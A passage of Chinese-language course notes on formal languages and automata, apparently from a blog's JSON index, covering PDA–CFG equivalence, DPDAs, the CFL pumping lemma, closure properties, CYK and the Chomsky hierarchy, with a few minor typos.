\\underset{}{\\stackrel{\\ast}{\\Rightarrow}} \\epsilon$且$A</p>\n<p>归纳递推：假设$i \\leq n(n \\geq 0)$时上式成立。当$i = n+1$时，因为$A$是变元，其第1步转移一定是</p>\n<script type=\"math/tex; mode=display\">\n(q,x,A) \\vdash (q,x,Y_1 Y_2 \\dots Y_m)</script><p>且$A \\to Y_1 Y_2 \\dots Y_m$是产生式，其中$Y_i$是变元或终结符，而其余的$n$步转移</p>\n<script type=\"math/tex; mode=display\">\n(q,x,Y_1 Y_2 \\dots Y_m) \\vdash^{\\ast} (q,\\epsilon,\\epsilon)</script><p>中每个$Y_i$从栈中被完全弹出时，将消耗掉的那部分$x$记为$x_i$，那么显然有</p>\n<script type=\"math/tex; mode=display\">\nx=x_1 x_2 \\dots x_m</script><p>而每个$Y_i$从栈中被完全弹出时，都不超过$n$步，所以由归纳假设</p>\n<script type=\"math/tex; mode=display\">\n(q,x_i,Y_i) \\vdash^{\\ast} (q,\\epsilon,\\,\\epsilon) \\Rightarrow Y_i \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} x_ix_i</script><p>再由$A$的产生式$A \\to Y_1 Y_2 \\dots Y_m$，有</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nA &\\underset{}{\\stackrel{\\ast}{\\Rightarrow}} Y_1 Y_2 \\dots Y_m \\\\\n&\\underset{}{\\stackrel{\\ast}{\\Rightarrow}} x_1 Y_2 \\dots Y_m \\\\\n&\\underset{}{\\stackrel{\\ast}{\\Rightarrow}} x_1 x_2 \\dots Y_m \\\\\n&\\underset{}{\\stackrel{\\ast}{\\Rightarrow}} x_1 x_2 \\dots x_m = x\n\\end{aligned}</script><p>因此当$A=S,x=w$时，</p>\n<script type=\"math/tex; mode=display\">\n(q,w,S) \\vdash^{\\ast} (q,\\epsilon,\\epsilon) \\Longrightarrow S \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} w</script><p>成立，即必要性得证。所以，任何CFL都可由PDA识别。</p>\n<p><strong>构造与GNF格式文法等价的PDA</strong><br>如果GNF格式的CFG $G=(V,T,P^{\\prime},S)$，那么构造PDA</p>\n<script type=\"math/tex; mode=display\">\nP = (\\lbrace q \\rbrace,T,V,\\delta,q,S,\\emptyset)</script><p>为每个产生式，定义$\\delta$为：</p>\n<script type=\"math/tex; mode=display\">\n\\delta(q,a,A)=\\lbrace (q,\\beta) \\vert A \\to a\\beta \\in P^{\\prime} \\rbrace</script><p>续例6：文法$S \\to aAA, A \\to aS \\vert  bS \\vert a$为GNF格式，构造等价的PDA<br><img src=\"90.png\" alt=\"\"></p>\n<h3 id=\"从PDA到CFG\"><a href=\"#从PDA到CFG\" class=\"headerlink\" title=\"从PDA到CFG\"></a>从PDA到CFG</h3><p><strong>定理</strong>：如果PDA $P$，由$L=\\boldsymbol{N}(P)$，那么$L$是上下文无关语言。</p>\n<p><strong>构造与PDA等价的CFG</strong><br>如果PDA $P=(Q,\\Sigma,\\Gamma,\\delta,q_0,Z_0,F)$，那么构造CFG $G=(V,T,P^{\\prime},S)$，其中$V$和$P^{\\prime}$为：</p>\n<ol>\n<li>$V=\\lbrace [qX_p] \\vert p,q \\in Q,X \\in \\Gamma \\rbrace \\cup \\lbrace S \\rbrace$</li>\n<li>对$\\forall p \\in Q$，构造产生式$S \\to [q_0Z_0p]$</li>\n<li>对$\\forall (p,Y_1 Y_2 \\dots Y_n) \\in \\delta(q,a,X)$，构造$\\vert Q \\vert^{n}$个产生式</li>\n</ol>\n<p>其中$a \\in \\Sigma \\cup \\lbrace \\epsilon \\rbrace, X,Y_i \\in \\Gamma$，而$r_i \\in Q$是$n$次$\\vert Q \\vert$种状态的组合。若$i=0$，为$[qX_p] \\to a$</p>\n<p>例7：将PDA $P=(\\lbrace p,q \\rbrace,(0,1),\\lbrace X,Z \\rbrace, \\delta, q,Z)$<br>转为CFG，其中$\\delta$如下：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\delta(q,1,Z) &= \\lbrace (q,XZ) \\rbrace \\\\\n\\delta(q,1,X) &= \\lbrace (q,XX) \\rbrace \\\\\n\\delta(q,0,X) &= \\lbrace (p,X) \\rbrace \\\\\n\\delta(q,\\epsilon,Z) &= \\lbrace (q,\\epsilon) \\rbrace \\\\\n\\delta(q,1,X) &= \\lbrace (p,\\epsilon) \\rbrace \\\\\n\\delta(q,0,Z) &= \\lbrace (q,Z) \\rbrace \\\\\n\\end{aligned}</script><p><img src=\"91.png\" alt=\"\"></p>\n<h2 id=\"确定性下推自动机\"><a href=\"#确定性下推自动机\" class=\"headerlink\" title=\"确定性下推自动机\"></a>确定性下推自动机</h2><p><strong>定义</strong>：如果PDA $P=(Q,\\Sigma,\\Gamma,\\delta,q_0,Z_0,F)$满足</p>\n<ol>\n<li>$\\forall a \\in \\Sigma \\cup \\lbrace \\epsilon \\rbrace, \\delta(q,a,X)$至多有一个动作</li>\n<li>$\\forall a \\in \\Sigma$，如果$\\delta(q,a,X) \\not= \\emptyset$，那么$\\delta(q,\\epsilon,X)=\\emptyset$</li>\n</ol>\n<p>则称$P$为确定型下推自动机(DPDA)</p>\n<p>DPDA $P$以终态的方式接受的语言$\\boldsymbol{L}(P)$称为DCFL</p>\n<ul>\n<li>DPDA中$\\forall (q,a,Z) \\in Q \\times \\Sigma \\times \\Gamma$满足$\\vert \\delta(q,a,Z) \\vert + \\vert \\delta(q,\\epsilon,Z) \\vert \\leq 1$</li>\n<li>DPDA与PDA不等价</li>\n</ul>\n<p>例8：任何DPDA都无法接受$L_{wwr}$，但是可以接受</p>\n<script type=\"math/tex; mode=display\">\nL_{wcwr} = \\lbrace wcw^R \\vert w \\in (0+1)^{\\ast} \\rbrace</script><p><img src=\"92.png\" alt=\"\"></p>\n<p>DCFL的重要应用</p>\n<ul>\n<li>非固有歧义语言的真子集</li>\n<li>程序设计语言的语法分析器</li>\n<li>$LR(k)$文法，Yacc的基础，解析时间复杂度为$O(n)$</li>\n</ul>\n<h3 id=\"正则语言与DPDA\"><a href=\"#正则语言与DPDA\" class=\"headerlink\" title=\"正则语言与DPDA\"></a>正则语言与DPDA</h3><p><strong>定理29</strong>：如果$L$是正则语言，那么存在DPDA $P$以终态方式接受$L$，即$L=\\boldsymbol{L}(P)$</p>\n<p><strong>证明</strong>：显然，DPDA $P$可以不用栈而莫模拟任何DFA</p>\n<ul>\n<li>$L_{wcwr}$显然CFL，所以DCFL语言类真包含正则语言</li>\n<li>DPDA无法识别$L_{wwr}$，所以DCFL语言真包含于CFL</li>\n</ul>\n<p><strong>定义</strong>：如果语言$L$中不存在字符串$x$和$y$，使$x$是$y$的前缀，称语言$L$满足前缀性质</p>\n<p><strong>定理30</strong>：DPDA $P$且$L=\\boldsymbol{N}(P)$，当且仅当$L$由前缀性质，且存在DPDA $P^{\\prime}$使$L=\\boldsymbol{L}(P^{\\prime})$</p>\n<ul>\n<li>DPDA $P$的$\\boldsymbol{N}(P)$更有限，即使正则语言$\\boldsymbol{0}^{\\ast}$也无法接受</li>\n<li>但却可以被某个DPDA以终态方式接受</li>\n</ul>\n<h3 id=\"DPDA与歧义文法\"><a href=\"#DPDA与歧义文法\" class=\"headerlink\" title=\"DPDA与歧义文法\"></a>DPDA与歧义文法</h3><p><strong>定理31</strong>：DPDA $P$，语言$L=\\boldsymbol{L}(P)$，那么$L$有无歧义的CFG</p>\n<p><strong>定理32</strong>：DPDA $P$，语言$L=\\boldsymbol{N}(P)$，那么$L$有无歧义的CFG</p>\n<ul>\n<li>因此DPDA再语法分析中占重要地位</li>\n<li>但是并非所有固有歧义CFL都会被DPDA识别如$L_{wwr}$有无歧义文法$S \\to 0S1 \\vert 1S1 \\vert \\epsilon$</li>\n</ul>\n<p>语言之间的关系：<img src=\"93.png\" alt=\"\"></p>\n","categories":["形式语言与自动机理论"],"tags":["形式语言与自动机理论"]},{"title":"形式语言与自动机理论（5）上下文无关语言的性质","url":"/2021/02/04/%E5%BD%A2%E5%BC%8F%E8%AF%AD%E8%A8%80%E4%B8%8E%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%90%86%E8%AE%BA%EF%BC%885%EF%BC%89%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E8%AF%AD%E8%A8%80%E7%9A%84%E6%80%A7%E8%B4%A8/","content":"<h2 id=\"上下文无关语言的泵引理\"><a href=\"#上下文无关语言的泵引理\" class=\"headerlink\" title=\"上下文无关语言的泵引理\"></a>上下文无关语言的泵引理</h2><p><strong>定理33</strong>：如果语言$L$是CFL，那么存在正整数$N$，对$\\forall z \\in L$，只要$\\vert z \\vert \\geq N$，就可以将$z$分为五部分$z=uvwxy$满足</p>\n<ul>\n<li>$vx \\not= \\epsilon$（或$\\vert vx \\vert \\gt 0$）</li>\n<li>$\\vert vwx \\vert \\leq N$</li>\n<li>$\\forall i \\geq 0,wv^iwx^iy \\in L$</li>\n</ul>\n<p><strong>证明</strong>：</p>\n<ol>\n<li>设CNF格式CFG $G$中变元数$\\vert V \\vert = m$，令$N = 2^m$，若有$z \\in L(G)$，且$\\vert z \\vert \\geq N$</li>\n<li>则$z$的派生树内节点是二叉树，最长路径长度至少$m+1$，节点至少$m+2$</li>\n<li>该路径下由上之上$m+1$个节点中，必有两个$T_2$和$T_1$标记了相同的变元$A$</li>\n<li>若标记$T_2$产物为$w$，且是$T_1$的子树，$T_1$的产物可记为$vwx$，则有$A \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} vAx$和$A \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} w$</li>\n<li>那么$\\forall i \\geq 0, A \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} v^iwx^i$。不妨设$z=wvwxy$，则$S \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} uAy \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} uv^iwx^iy$</li>\n<li>$T_1$路径长不超过$m+1$，那么$T_1$产物长度不超过$2^m$，所以$\\vert vwx \\vert \\leq 2^m$</li>\n<li>$T_2$必在$T_1$的左/右儿子中，所以$v$和$x$不可能同时为空，即$vx \\not= \\epsilon$<br><img src=\"100.png\" alt=\"\"><span id=\"more\"></span>\n</li>\n</ol>\n<h3 id=\"泵引理应用\"><a href=\"#泵引理应用\" class=\"headerlink\" title=\"泵引理应用\"></a>泵引理应用</h3><p>例1：证明$L=\\lbrace 0^n1^n2^n \\vert n \\geq 1 \\rbrace$不是上下文无关语言</p>\n<p><strong>证明</strong>：</p>\n<ol>\n<li>假设$L$是CFL，那么存在整数$N$，对$\\forall z \\in L(\\vert z \\vert \\geq N)$满足泵引理</li>\n<li>从$L$中取$z=0^N1^N2^N$，则显然$z \\in L$且$\\vert z \\vert = 3N \\geq N$</li>\n<li>由泵引理，$z$可被分为$z=uvwxy$，且有$\\vert vwx \\vert \\leq N$和$vx \\not= \\epsilon$</li>\n<li>那么$vwx$可能<ul>\n<li>只包含0，1或2，那么$uwy \\not\\in L$</li>\n<li>只包含0和1，或只包含1和2，那么也有$uwy \\not\\in L$</li>\n</ul>\n</li>\n<li>与泵定理$uwy=uv^0wx^0y \\in L$矛盾，假设不成立</li>\n<li>$L$不是上下文无关的</li>\n</ol>\n<p>例2：证明$L = \\lbrace ww \\vert w \\in \\lbrace 0,1 \\rbrace^{\\ast} \\rbrace$不是上下文无关的。</p>\n<p>【错误的证明】：假设$L$是CFL，取$z=0^N10^N1$，那么$z=uvwxy$为<br><img src=\"101.png\" alt=\"\"><br>则对任意$i \\geq 0$，有$uv^iwx^iy \\in L$，满足泵定理</p>\n<p>【正确的证明】假设$L$是CFL。取$z=0^N1^N0^N1^N$，将$z$分为$z=uvwxy$时</p>\n<ol>\n<li>若$vwx$在$z$中点的一侧，$uv^0wx^0y$显然不可能属于$L$</li>\n<li>若$vwx$包括$z$中点，那么$uv^0wx^0y$为$0^N1^j0^j1^N$，也不可能属于$L$<br>所以，假设不成立，$L$不是CFL。</li>\n</ol>\n<h2 id=\"上下文无关语言的封闭性\"><a href=\"#上下文无关语言的封闭性\" class=\"headerlink\" title=\"上下文无关语言的封闭性\"></a>上下文无关语言的封闭性</h2><h3 id=\"代换的封闭性\"><a href=\"#代换的封闭性\" class=\"headerlink\" title=\"代换的封闭性\"></a>代换的封闭性</h3><p><strong>定义</strong>：两个字母表$\\Sigma$到$\\Gamma$的函数$s:\\Sigma \\to 2^{\\Gamma^{\\ast}}$称为代换，$\\Sigma$中一个字符$a$在$s$的作用下为$\\Gamma$上的一个语言$L_a$，即</p>\n<script type=\"math/tex; mode=display\">\ns(a)=L_\\alpha</script><p>扩展$s$的定义到字符串</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\ns(\\epsilon) &= \\boldsymbol{\\epsilon} \\\\\ns(xa) &= s(x)s(a)\n\\end{aligned}</script><p>再扩展$h$到语言，对$\\forall L \\subseteq \\Sigma^{\\ast}$</p>\n<script type=\"math/tex; mode=display\">\ns(L) = \\bigcup_{x \\in L}s(x)</script><p><strong>定理34</strong>：如果$\\Sigma$上的CFL $L$和代换$s$，且每个$a \\in \\Sigma$的$s(a)$都是CFL，那么$s(L)$也是CFL</p>\n<p><strong>构造方法</strong><br>设CFL $L$的文法$G=(V,T,P,S)$，每个$s(\\alpha)$的文法$G<em>\\alpha=(V</em>\\alpha,T<em>\\alpha,P</em>\\alpha,S_\\alpha)$，那么$s(L)$的文法可以构造为</p>\n<script type=\"math/tex; mode=display\">\nG^{\\prime} = (V^{\\prime},T^{\\prime},P^{\\prime},S)</script><ol>\n<li>$V^{\\prime} = V \\cup (\\bigcup_{a \\in T}V_a)$</li>\n<li>$T^{\\prime} = \\bigcup_{a \\in T} T_a$</li>\n<li>$P_{\\prime}$包括每个$P_a$和$P$中产生式，但是要将$P$的产生式中每个终结符$a$均替换为文法$G_a$的开始符号$S_a$</li>\n</ol>\n<p>证明：对$\\forall w \\in s(L)$，那么一定存在某个$x = a_1 a_2 \\dots a_n \\in L$，使</p>\n<script type=\"math/tex; mode=display\">\nw \\in s(x) = s(a_1)s(a_2) \\dots s(a_n)</script><p>那么$w$可以分为$w = w_1 w_2 \\dots w_n$，且$w_i \\in s(a_i)$，即</p>\n<script type=\"math/tex; mode=display\">\nS_{a_i} \\underset{G_{a_i}}{\\stackrel{\\ast}{\\Longrightarrow}} w_i</script><p>由于$S \\underset{\\ast}{\\stackrel{G}{\\Rightarrow}} x = a_1 a_2 \\dots a_n$，所以</p>\n<script type=\"math/tex; mode=display\">\nS \\underset{G}{\\stackrel{\\ast}{\\Rightarrow}} S_{a_1} S_{a_2} \\dots S_{a_n} \\underset{G}{\\stackrel{\\ast}{\\Rightarrow}} w_1 w_2 \\dots w_n = w</script><p>所以$w \\in \\boldsymbol{L}(G^{\\prime})$，即$s(L) \\subseteq \\boldsymbol{L}(G^{\\prime})$</p>\n<p>因为$G^{\\prime}$的终结符仅能由每个$S_a$派生，因此对$\\forall w \\in \\boldsymbol{L}(G^{\\prime})$有</p>\n<script type=\"math/tex; mode=display\">\nS \\underset{G}{\\stackrel{\\ast}{\\Rightarrow}} \\alpha = S_{a_1}S_{a_2}  \\dots S_{a_n} \\underset{G}{\\stackrel{\\ast}{\\Rightarrow}} w</script><p>因为$G^{\\prime}$中每个$S_a$在$G$中是终结符$a$，所以</p>\n<script type=\"math/tex; mode=display\">\nS \\underset{G}{\\stackrel{\\ast}{\\Rightarrow}} a_1 a_2 \\dots a_n = x \\in L</script><p>又因为$\\alpha = S<em>{a_1}S</em>{a<em>2}  \\dots S</em>{a<em>n} \\underset{G}{\\stackrel{\\ast}{\\Rightarrow}} w = w_1 \\dots w_n$，所以$S</em>{a_i} \\underset{G}{\\stackrel{\\ast}{\\Rightarrow}} w_i$，即$w_i \\in s(a_i)$，那么</p>\n<script type=\"math/tex; mode=display\">\nw = w_1 w_2 \\dots w_n \\in s(a_1)s(s_2)\\dots s(a_n) = s(a_1 a_2 \\dots a_n) = s(x) \\subset s(L)</script><p>所以$w \\in s(L)$，即$\\boldsymbol{L}(G^{\\prime}) \\subseteq s(L)$，因此$\\boldsymbol{L}(G^{\\prime}) = s(L)$</p>\n<p>例3：设$L = \\lbrace w \\in \\lbrace a,b \\rbrace^{\\ast} \\vert w有相等个数的a和b \\rbrace$，代换</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\ns(a) &= L_a = \\lbrace 0^n1^n \\vert n \\geq 1 \\rbrace \\\\\ns(b) &= L_b = \\lbrace ww^R \\vert w \\in (\\boldsymbol{0}+ \\boldsymbol{1})^{\\ast} \\rbrace\n\\end{aligned}</script><p>求$s(L)$的文法</p>\n<p>解：设计$L$的文法为：</p>\n<script type=\"math/tex; mode=display\">\nS \\to aSbS \\vert bSaS \\vert \\epsilon</script><p>$L_a$的文法为：</p>\n<script type=\"math/tex; mode=display\">\nS_a \\to 0S_a1 \\vert 01</script><p>$L_b$的文法为：</p>\n<script type=\"math/tex; mode=display\">\nS_b \\to 0S_b0 \\vert 1S_b1 \\vert \\epsilon</script><p>那么$s(L)$的文法为：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to S_a S S_b S \\vert S_b S S_a S \\vert \\epsilon \\\\\nS_a &\\to 0S_a1 \\vert 01 \\\\\nS_b &\\to 0S_b0 \\vert 1S_b1 \\vert \\epsilon\n\\end{aligned}</script><h3 id=\"并-连接-闭包-同态-逆同态-反转的封闭性\"><a href=\"#并-连接-闭包-同态-逆同态-反转的封闭性\" class=\"headerlink\" title=\"并/连接/闭包/同态/逆同态/反转的封闭性\"></a>并/连接/闭包/同态/逆同态/反转的封闭性</h3><p><strong>定理</strong>：上下文无关语言在并，连接，闭包，正闭包，同态下封闭</p>\n<p><strong>证明1</strong>：设$\\Sigma=\\lbrace 0,1 \\rbrace$，$L_1,L_2$是任意CFL，定义代换</p>\n<script type=\"math/tex; mode=display\">\ns(1) = L_1, \\ s(2) = L_2</script><p>语言$\\lbrace 1,2 \\rbrace, \\lbrace 12 \\rbrace, \\lbrace 1 \\rbrace^{\\ast}$和$\\lbrace 1 \\rbrace^{+}$显然都是CFL，那么</p>\n<ol>\n<li>由$s(\\lbrace 1,2 \\rbrace)=s(1) \\cup s(2) = L_1 \\cup L_2$，所以运算封闭</li>\n<li>由$s(\\lbrace 12 \\rbrace) = s(12) = s(\\epsilon)s(1)s(2)=L_1 L_2$，所以连接运算封闭</li>\n<li>闭包和正闭包运算封闭，因为<script type=\"math/tex; mode=display\">\n\\begin{aligned}\ns(\\lbrace 1 \\rbrace^{\\ast}) &= s(\\lbrace \\epsilon,1,11,\\dots \\rbrace) \\\\\n&= s(\\epsilon) \\cup s(1) \\cup s(11) \\cup \\dots \\\\\n&= \\lbrace \\epsilon \\rbrace \\cup s(1) \\cup s(1)s(1) \\cup \\dots \\\\\n&=L_1^{\\ast}\n\\end{aligned}</script>若$h$是$\\Gamma$上的同态，$L$是$\\Sigma$上的CFL，对$\\forall a \\in \\Sigma$令代换$s^{\\prime} = \\lbrace h(a) \\rbrace$，则<script type=\"math/tex; mode=display\">\nh(L) = \\lbrace h(w) \\vert w \\in L \\rbrace = \\bigcup_{w \\in L}\\lbrace h(w) \\rbrace = \\bigcup_{w \\in L}s^{\\prime}(w) = s^{\\prime}(L)</script>所以同态封闭</li>\n</ol>\n<p><strong>证明2</strong>：用文法证明并/连接/闭包的封闭性。设CFL $L_1,L_2$文法分别为</p>\n<script type=\"math/tex; mode=display\">\nG_1 = (V_1,T_1,P_1,S_1), \\ G_2=(V_2,T_2,P_2,S_2)</script><p>那么，分别构造</p>\n<ol>\n<li>$L_1 \\cup L_2$的文法为<script type=\"math/tex; mode=display\">\nG_{union}=(V_1 \\cup V_2 \\cup \\lbrace S \\rbrace,T_1 \\cup T_2, P_1 \\cup P_2 \\cup \\lbrace S \\to S_1 \\vert S_2 \\rbrace, S)</script></li>\n<li>$L_1L_2$的文法为<script type=\"math/tex; mode=display\">\nG_{concat} = (V_1 \\cup V_2 \\cup \\lbrace S \\rbrace, T_1 \\cup T_2, P_1 \\cup P_2 \\cup \\lbrace S \\to S_1 S_2 \\rbrace, S)</script></li>\n<li>$L_1^{\\ast}$的文法为<script type=\"math/tex; mode=display\">\nG_{closure} = (V_1 \\cup \\lbrace S \\rbrace, T_1,P_1 \\cup \\lbrace S \\to S_1 S \\vert \\epsilon \\rbrace, S)</script>再证明所构造的文法的正确性，略</li>\n</ol>\n<p><strong>定理36</strong>：如果$L$是CFL，那么$L^R$也是CFL</p>\n<p><strong>证明</strong>：设$L$的文法$G=(V,T,P,S)$，构造文法</p>\n<script type=\"math/tex; mode=display\">\nG^{\\prime} = (V,T,\\lbrace A \\to \\alpha^R \\vert A \\to \\alpha \\in P \\rbrace, S)</script><p>则$L(G^{\\prime})=L^R$，证明略</p>\n<p><strong>定理37</strong>：如果$L$是字母表$\\Delta$上的CFL，$h$是字母表$\\Sigma$到$\\Delta^{\\ast}$的同态，那么$h^{-1}(L)$也是CFL</p>\n<p><strong>证明</strong>：设PDA $P=(Q,\\Delta,\\Gamma,\\delta,q_0,Z_0,F), \\boldsymbol{L}(P)=L$<br>构造$\\boldsymbol{L}(P^{\\prime})=h^{\\prime}(L)$的PDA</p>\n<script type=\"math/tex; mode=display\">\nP^{\\prime} = (Q^{\\prime},\\Sigma,\\Gamma,\\delta^{\\prime},[q_0,\\bar{\\epsilon}],Z_0,F \\times \\lbrace \\bar{\\epsilon} \\rbrace)</script><p>在$P^{\\prime}$的状态中，使用缓冲，暂存字符$a \\in \\Sigma$的同态字符$a \\in \\Sigma$的同态串$h(a)$的后缀</p>\n<ol>\n<li>$Q^{\\prime} \\subset Q \\times \\Delta^{\\ast}$：状态$[q,\\bar{x}]$中的$\\bar{x}$为缓冲</li>\n<li>设$q \\in Q$，那么$\\delta^{\\prime}$定义如下<ul>\n<li>$\\forall [q,\\bar{\\epsilon}] \\in Q \\times \\lbrace \\bar{\\epsilon}, \\forall a \\in \\Sigma, \\forall X \\in T$<script type=\"math/tex; mode=display\">\n\\delta^{\\prime}([q,\\bar{\\epsilon}],a,X) = \\lbrace([q,h(a)],X) \\rbrace</script></li>\n<li>若$\\delta(q,\\bar{a},X)=\\lbrace (p_1,\\beta_1),(p_2,\\beta_2) \\dots (p_k,\\beta_k) \\rbrace$，则<script type=\"math/tex; mode=display\">\n\\delta^{\\prime}([q,\\overline{ax}],\\epsilon,X) = \\lbrace ([p_1,\\bar{x}],\\beta_1),([p_2,\\bar{x}],\\beta_2),\\dots,([p_k,\\bar{x}],\\beta_k)</script>这里$\\bar{a} \\in \\Delta \\cup \\lbrace \\bar{\\epsilon} \\rbrace$，$\\bar{x}$是某个$h(a)$的后缀</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"交和补运算不封闭\"><a href=\"#交和补运算不封闭\" class=\"headerlink\" title=\"交和补运算不封闭\"></a>交和补运算不封闭</h3><p><strong>CFL对交运算不封闭</strong><br>因为语言</p>\n<script type=\"math/tex; mode=display\">\nL_1 = \\lbrace 0^n1^n2^i \\vert n \\geq 1,i \\geq 1 \\rbrace \\\\\nL_2 = \\lbrace 0^i1^n2^n \\vert n \\geq 1,i \\geq 1 \\rbrace</script><p>都是CFL，而</p>\n<script type=\"math/tex; mode=display\">\nL_1 \\cap L_2 = \\lbrace 0^n1^n2^n \\vert n \\geq 1 \\rbrace</script><p>不是CFL</p>\n<p><strong>CFL对补运算不封闭</strong><br>因为$L_1 \\cap L_2 = \\overline{\\overline{L_1} \\cup \\overline{L_2}}$</p>\n<p><strong>定理38</strong>：若$L$是CFL且$R$是正则语言，则$L \\cap R$是CFL</p>\n<p><strong>证明</strong>：<br>设DFA $D=(Q_1,\\Sigma,\\delta_1,p_1,F_1)$且$\\boldsymbol{L}(D) = R$，PDA $P=(Q_2,\\Sigma,\\Gamma,\\delta_2,q_2,Z_0,F_2)$，且$\\boldsymbol{L}(P)=L$。构造PDA</p>\n<script type=\"math/tex; mode=display\">\nP^{\\prime} = (Q_1 \\times Q_2,\\Sigma,\\Gamma,\\delta,[q_1,q_2],Z_0,F_1 \\times F_2)</script><p>其中$\\delta$为：</p>\n<script type=\"math/tex; mode=display\">\n\\delta([p,q],a,Z)=\n\\begin{cases}\n\\lbrace([p,s],\\beta) \\vert (s,\\beta) \\in \\delta_2(q,a,Z) \\rbrace & a=\\epsilon \\\\\n\\lbrace([r,s],\\beta) \\vert r=\\delta_1(p,a) \\land (s,\\beta) \\in \\delta_2(q,a,Z) \\rbrace & a \\not= \\epsilon\n\\end{cases}</script><p>再往证$\\boldsymbol{L}(P^{\\prime})=L \\cap R$，略。</p>\n<h3 id=\"封闭性的运用\"><a href=\"#封闭性的运用\" class=\"headerlink\" title=\"封闭性的运用\"></a>封闭性的运用</h3><p>例4：请证明语言$L$不是CFL</p>\n<script type=\"math/tex; mode=display\">\nL = \\lbrace w \\in \\lbrace a,b,c \\rbrace^{\\ast} \\vert n_a(w) = n_b(w) = n_c(w) \\rbrace</script><p>其中$n_a(w)$表示$w$中$a$的个数</p>\n<p><strong>证明</strong>：</p>\n<ol>\n<li>因为$\\boldsymbol{a}^{\\ast}\\boldsymbol{b}^{\\ast}\\boldsymbol{c}^{\\ast}$是正则语言</li>\n<li>而$L \\cap \\boldsymbol{a}^{\\ast}\\boldsymbol{b}^{\\ast}\\boldsymbol{c}^{\\ast} = \\lbrace a^n b^n c^n \\vert n \\geq 0 \\rbrace$不是CFL</li>\n<li>由CFL与正则语言的交还是CFL，所以$L$不可能是CFL</li>\n</ol>\n<h2 id=\"上下文无关语言的判定性质\"><a href=\"#上下文无关语言的判定性质\" class=\"headerlink\" title=\"上下文无关语言的判定性质\"></a>上下文无关语言的判定性质</h2><p><strong>可判定的CFL问题</strong></p>\n<ul>\n<li>空性：只需判断文法的开始符号$S$是否为非产生的</li>\n<li>有穷性和无穷性<ul>\n<li>用不带无用符号的CNF的产生式画有向图</li>\n<li>变元为顶点，若有$A \\to BC$，则$A$到$B$和$C$各画一条有向边</li>\n<li>检察图中是否有循环</li>\n</ul>\n</li>\n<li>成员性：利用CNF范式，有CYK算法检查串$w$是否属于$L$</li>\n</ul>\n<p>**$CYK^1$算法</p>\n<ul>\n<li>CNF $G=(V,T,P,S)$，以$O(n^3)$时间检查”$w=a_1 a_2 \\dots a_n \\in \\boldsymbol{L}(G)$?”</li>\n<li>以动态规划的方式，在表中由下至上逐行计算$X<em>{ij}$，再检查”$S \\in X</em>{1n}$?”<script type=\"math/tex; mode=display\">\n X_{ij} = \\lbrace A \\in V \\vert A \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} a_i a_{i+1} \\dots a_j, 1 \\leq i \\leq j \\leq n \\rbrace</script></li>\n<li>计算首行<script type=\"math/tex; mode=display\">\n X_{ii} = \\lbrace A \\vert A \\to a_i \\in P \\rbrace</script></li>\n<li>计算其他<script type=\"math/tex; mode=display\">\n X_{ij} = \\lbrace A \\vert i \\leq k \\lt j, BC \\in X_{ik}X_{k+1,j}, A \\to BC \\in P \\rbrace</script> <img src=\"102.png\" alt=\"\"></li>\n</ul>\n<p>例5：CNF $G$如下，用CYK算法判断$bababaa \\in \\boldsymbol{L}(G)$</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to AB \\vert BC \\\\\nA &\\to BA \\vert a \\\\\nB &\\to CC \\vert b \\\\\nC &\\to AB \\vert a\n\\end{aligned}</script><p><img src=\"103.png\" alt=\"\"></p>\n<p>因为$S \\in X_16 = \\lbrace S,A \\rbrace$，所以$bbabaa \\in \\boldsymbol{L}(G)$</p>\n<p><strong>不可判定的CFL问题</strong>  </p>\n<ul>\n<li>判断CFG $G$是否歧义的?</li>\n<li>判断CFL是否固有歧义的?</li>\n<li>两个CFL的交是否为空？</li>\n<li>两个CFL是否相同？</li>\n<li>判断CFL的补是否为空？尽管有算法判断CFL是否为空</li>\n<li>判断CFL是否等于$\\Sigma$</li>\n</ul>\n<h2 id=\"乔姆斯基文法体系\"><a href=\"#乔姆斯基文法体系\" class=\"headerlink\" title=\"乔姆斯基文法体系\"></a>乔姆斯基文法体系</h2><p>如果文法$G=(V,T,P,S)$，符号串$\\alpha \\in (V \\cup T)^{\\ast} V (V \\cup T)^{\\ast}$，$\\beta \\in (V \\cup T)^{\\ast}$，产生式都形如</p>\n<script type=\"math/tex; mode=display\">\n\\alpha \\to \\beta</script><p>即每个产生式的左部$\\alpha$中部至少要有一个变元，那么：</p>\n<ol>\n<li>称$G$为0型文法或短语结构文法</li>\n<li>若$\\vert \\beta \\vert \\geq \\vert \\alpha \\vert$，称$G$称为1型文法或上下文有关文法</li>\n<li>若$\\alpha \\in V$，称$G$为2型文法或上下文无关文法</li>\n<li>若$\\alpha \\to \\beta$都形如$A \\to aB$或$A \\to a$，称$G$为3型文法或正则文法</li>\n</ol>\n","categories":["形式语言与自动机理论"],"tags":["形式语言与自动机理论"]},{"title":"形式语言与自动机理论（6）图灵机与不可判定性","url":"/2021/02/04/%E5%BD%A2%E5%BC%8F%E8%AF%AD%E8%A8%80%E4%B8%8E%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%90%86%E8%AE%BA%EF%BC%886%EF%BC%89%E5%9B%BE%E7%81%B5%E6%9C%BA%E4%B8%8E%E4%B8%8D%E5%8F%AF%E5%88%A4%E5%AE%9A%E6%80%A7/","content":"<h1 id=\"图灵机\"><a href=\"#图灵机\" class=\"headerlink\" title=\"图灵机\"></a>图灵机</h1><p><img src=\"110.png\" alt=\"\"></p>\n<p><strong>定义</strong>：图灵机（TM，Turing Machine）M为七元组</p>\n<script type=\"math/tex; mode=display\">\nM = (Q,\\Sigma, \\Gamma, \\delta, q_0, B, 